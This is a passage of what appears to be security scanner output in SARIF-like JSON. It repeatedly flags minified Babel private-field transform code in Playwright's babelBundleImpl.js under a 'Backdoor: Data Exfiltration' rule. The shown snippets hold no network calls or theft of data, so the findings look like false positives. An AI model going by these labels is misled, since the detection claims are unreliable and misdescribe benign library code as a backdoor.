                    "text": "        writable: true,\n        value: ${s}\n      });\n    `,t)}function _be(e,t,r,n){let{id:s}=r.get(t.node.key.id.name),i=t.node.value||t.scope.buildUndefinedNode();if(!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.template.statement.ast`${N.types.cloneNode(s)}.set(${e}, {\n          // configurable is always false for private elements\n          // enumerable is always false for private elements\n          writable: true,\n",
                    "rendered": {
                      "text": "        writable: true,\n        value: ${s}\n      });\n    `,t)}function _be(e,t,r,n){let{id:s}=r.get(t.node.key.id.name),i=t.node.value||t.scope.buildUndefinedNode();if(!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.template.statement.ast`${N.types.cloneNode(s)}.set(${e}, {\n          // configurable is always false for private elements\n          // enumerable is always false for private elements\n          writable: true,\n",
                      "markdown": "`        writable: true,\n        value: ${s}\n      });\n    `,t)}function _be(e,t,r,n){let{id:s}=r.get(t.node.key.id.name),i=t.node.value||t.scope.buildUndefinedNode();if(!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.template.statement.ast`${N.types.cloneNode(s)}.set(${e}, {\n          // configurable is always false for private elements\n          // enumerable is always false for private elements\n          writable: true,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 7657,
                  "endLine": 1779,
                  "endColumn": 7662,
                  "snippet": {
                    "text": "t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,Object.assign({privateNamesMap:r,classRef:e,file:o},u,{noDocumentAll:i,noUninitializedPrivateFieldAccess:s,innerBinding:a})),l.traverse(Cbe,{privateNamesMap:r,classRef:e,file:o,privateFieldsAsProperties:n,innerBinding:a})}function jO(e,t,r){let{id:n}=r.get(t.node.key.id.name),s=t.node.value||t.scope.buildUndefinedNode();return Yt(N.template.statement.ast`\n      Object.defineProperty(${e}, ${N.types.cloneNode(n)}, {\n        // configurable is false by default\n        // enumerable is false by default\n        writable: true,\n        value: ${s}\n      })",
                    "rendered": {
                      "text": "t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,Object.assign({privateNamesMap:r,classRef:e,file:o},u,{noDocumentAll:i,noUninitializedPrivateFieldAccess:s,innerBinding:a})),l.traverse(Cbe,{privateNamesMap:r,classRef:e,file:o,privateFieldsAsProperties:n,innerBinding:a})}function jO(e,t,r){let{id:n}=r.get(t.node.key.id.name),s=t.node.value||t.scope.buildUndefinedNode();return Yt(N.template.statement.ast`\n      Object.defineProperty(${e}, ${N.types.cloneNode(n)}, {\n        // configurable is false by default\n        // enumerable is false by default\n        writable: true,\n        value: ${s}\n      })",
                      "markdown": "`t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,Object.assign({privateNamesMap:r,classRef:e,file:o},u,{noDocumentAll:i,noUninitializedPrivateFieldAccess:s,innerBinding:a})),l.traverse(Cbe,{privateNamesMap:r,classRef:e,file:o,privateFieldsAsProperties:n,innerBinding:a})}function jO(e,t,r){let{id:n}=r.get(t.node.key.id.name),s=t.node.value||t.scope.buildUndefinedNode();return Yt(N.template.statement.ast`\n      Object.defineProperty(${e}, ${N.types.cloneNode(n)}, {\n        // configurable is false by default\n        // enumerable is false by default\n        writable: true,\n        value: ${s}\n      })`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 7358,
                  "endLine": 1779,
                  "endColumn": 7363,
                  "snippet": {
                    "text": "{return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){if(!r.size)return;let l=t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,Object.assign({privateNamesMap:r,classRef:e,file:o},u,{noDocumentAll:i,noUninitializedPrivateFieldAccess:s,innerBinding:a})),l.traverse(Cbe,{privateNamesMap:r,classRef:e,file:o,privateFieldsAsProperties:n,innerBinding:a})}function jO(e,t,r){let{id:n}=r.get(t",
                    "rendered": {
                      "text": "{return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){if(!r.size)return;let l=t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,Object.assign({privateNamesMap:r,classRef:e,file:o},u,{noDocumentAll:i,noUninitializedPrivateFieldAccess:s,innerBinding:a})),l.traverse(Cbe,{privateNamesMap:r,classRef:e,file:o,privateFieldsAsProperties:n,innerBinding:a})}function jO(e,t,r){let{id:n}=r.get(t",
                      "markdown": "`{return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){if(!r.size)return;let l=t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,Object.assign({privateNamesMap:r,classRef:e,file:o},u,{noDocumentAll:i,noUninitializedPrivateFieldAccess:s,innerBinding:a})),l.traverse(Cbe,{privateNamesMap:r,classRef:e,file:o,privateFieldsAsProperties:n,innerBinding:a})}function jO(e,t,r){let{id:n}=r.get(t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 7101,
                  "endLine": 1779,
                  "endColumn": 7106,
                  "snippet": {
                    "text": "Expression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){if(!r.size)return;let l=t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,O",
                    "rendered": {
                      "text": "Expression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){if(!r.size)return;let l=t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,O",
                      "markdown": "`Expression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){if(!r.size)return;let l=t.get(\"body\"),u=n?Ibe:Dbe;(0,Ebe.default)(l,Abe,O`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 7029,
                  "endLine": 1779,
                  "endColumn": 7034,
                  "snippet": {
                    "text": "er with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){i",
                    "rendered": {
                      "text": "er with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){i",
                      "markdown": "`er with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPrivateFieldAccess:s,noDocumentAll:i,innerBinding:a},o){i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 6976,
                  "endLine": 1779,
                  "endColumn": 6981,
                  "snippet": {
                    "text": "t(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPriv",
                    "rendered": {
                      "text": "t(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPriv",
                      "markdown": "`t(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFieldsAsProperties:n,noUninitializedPriv`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 6938,
                  "endLine": 1779,
                  "endColumn": 6943,
                  "snippet": {
                    "text": "oneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFi",
                    "rendered": {
                      "text": "oneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFi",
                      "markdown": "`oneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}};function Obe(e,t,r,{privateFi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 6841,
                  "endLine": 1779,
                  "endColumn": 6846,
                  "snippet": {
                    "text": ".expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivateFieldLooseBase\"),REF:N.types.cloneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Inte",
                    "rendered": {
                      "text": ".expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivateFieldLooseBase\"),REF:N.types.cloneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Inte",
                      "markdown": "`.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivateFieldLooseBase\"),REF:N.types.cloneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.get(e)},call(e,t){return N.types.callExpression(this.get(e),t)},optionalCall(e,t){return N.types.optionalCallExpression(this.get(e),t,!0)},delete(){throw new Error(\"Inte`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 6673,
                  "endLine": 1779,
                  "endColumn": 6678,
                  "snippet": {
                    "text": " error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.property.id;return N.template.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivateFieldLooseBase\"),REF:N.types.cloneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.g",
                    "rendered": {
                      "text": " error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.property.id;return N.template.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivateFieldLooseBase\"),REF:N.types.cloneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.g",
                      "markdown": "` error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.property.id;return N.template.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivateFieldLooseBase\"),REF:N.types.cloneNode(n),PROP:N.types.cloneNode(t.get(s).id)})},set(){throw new Error(\"private name handler with loose = true don't need set()\")},boundGet(e){return N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[N.types.cloneNode(e.node.object)])},simpleSet(e){return this.get(e)},destructureSet(e){return this.g`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 6301,
                  "endLine": 1779,
                  "endColumn": 6306,
                  "snippet": {
                    "text": ",N.types.arrayExpression(f.arguments.slice(0,-1))],N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),p),N.types.identifier(\"_\"))},call(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!1)},optionalCall(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.property.id;return N.template.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivat",
                    "rendered": {
                      "text": ",N.types.arrayExpression(f.arguments.slice(0,-1))],N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),p),N.types.identifier(\"_\"))},call(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!1)},optionalCall(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.property.id;return N.template.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivat",
                      "markdown": "`,N.types.arrayExpression(f.arguments.slice(0,-1))],N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),p),N.types.identifier(\"_\"))},call(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!1)},optionalCall(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.property.id;return N.template.expression`BASE(REF, PROP)[PROP]`({BASE:r.addHelper(\"classPrivat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 6207,
                  "endLine": 1779,
                  "endColumn": 6212,
                  "snippet": {
                    "text": "=[f.callee.object,N.types.arrayExpression(f.arguments.slice(1,-1)),f.arguments[0]]:p=[f.callee,N.types.arrayExpression(f.arguments.slice(0,-1))],N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),p),N.types.identifier(\"_\"))},call(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!1)},optionalCall(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.",
                    "rendered": {
                      "text": "=[f.callee.object,N.types.arrayExpression(f.arguments.slice(1,-1)),f.arguments[0]]:p=[f.callee,N.types.arrayExpression(f.arguments.slice(0,-1))],N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),p),N.types.identifier(\"_\"))},call(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!1)},optionalCall(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.",
                      "markdown": "`=[f.callee.object,N.types.arrayExpression(f.arguments.slice(1,-1)),f.arguments[0]]:p=[f.callee,N.types.arrayExpression(f.arguments.slice(0,-1))],N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),p),N.types.identifier(\"_\"))},call(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!1)},optionalCall(e,t){return this.memoise(e,1),(0,FO.default)(this.get(e),this.receiver(e),t,!0)},delete(){throw new Error(\"Internal Babel error: deleting private elements is a parsing error.\")}},Ibe={get(e){let{privateNamesMap:t,file:r}=this,{object:n}=e.node,{name:s}=e.node.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 5219,
                  "endLine": 1779,
                  "endColumn": 5224,
                  "snippet": {
                    "text": "ypes.memberExpression(N.types.callExpression(n.addHelper(\"classPrivateFieldDestructureSet\"),[this.receiver(e),N.types.cloneNode(a)]),N.types.identifier(\"value\"))}if(l&&!u)return N.types.memberExpression(N.types.sequenceExpression([e.node.object,Qf(n,i)]),N.types.identifier(\"_\"));if(o&&!l){let m=this.get(e);if(!s||!N.types.isCallExpression(m))return m;let b=m.arguments.pop();return m.arguments.push(N.template.expression.ast`(_) => ${b} = _`),N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),[m]),N.types.identifier(\"_\"))}let f=this.set(e,N.types.identifier(\"_\"));if(!N.types.isCa",
                    "rendered": {
                      "text": "ypes.memberExpression(N.types.callExpression(n.addHelper(\"classPrivateFieldDestructureSet\"),[this.receiver(e),N.types.cloneNode(a)]),N.types.identifier(\"value\"))}if(l&&!u)return N.types.memberExpression(N.types.sequenceExpression([e.node.object,Qf(n,i)]),N.types.identifier(\"_\"));if(o&&!l){let m=this.get(e);if(!s||!N.types.isCallExpression(m))return m;let b=m.arguments.pop();return m.arguments.push(N.template.expression.ast`(_) => ${b} = _`),N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),[m]),N.types.identifier(\"_\"))}let f=this.set(e,N.types.identifier(\"_\"));if(!N.types.isCa",
                      "markdown": "`ypes.memberExpression(N.types.callExpression(n.addHelper(\"classPrivateFieldDestructureSet\"),[this.receiver(e),N.types.cloneNode(a)]),N.types.identifier(\"value\"))}if(l&&!u)return N.types.memberExpression(N.types.sequenceExpression([e.node.object,Qf(n,i)]),N.types.identifier(\"_\"));if(o&&!l){let m=this.get(e);if(!s||!N.types.isCallExpression(m))return m;let b=m.arguments.pop();return m.arguments.push(N.template.expression.ast`(_) => ${b} = _`),N.types.memberExpression(N.types.callExpression(n.addHelper(\"toSetter\"),[m]),N.types.identifier(\"_\"))}let f=this.set(e,N.types.identifier(\"_\"));if(!N.types.isCa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 4524,
                  "endLine": 1779,
                  "endColumn": 4529,
                  "snippet": {
                    "text": ".cloneNode(o),this.receiver(e),t]):N.types.callExpression(s.addHelper(\"classPrivateFieldSet\"),[this.receiver(e),N.types.cloneNode(o),t])},destructureSet(e){let{classRef:t,privateNamesMap:r,file:n,noUninitializedPrivateFieldAccess:s}=this,{name:i}=e.node.property.id,{id:a,static:o,method:l,setId:u}=r.get(i);if(!ar(n)){if(o){try{var c=n.addHelper(\"classStaticPrivateFieldDestructureSet\")}catch{throw new Error(\"Babel can not transpile `[C.#p] = [0]` with @babel/helpers < 7.13.10, \\nplease update @babel/helpers to the latest version.\")}return N.types.memberExpression(N.types.callExpression(c,[this.recei",
                    "rendered": {
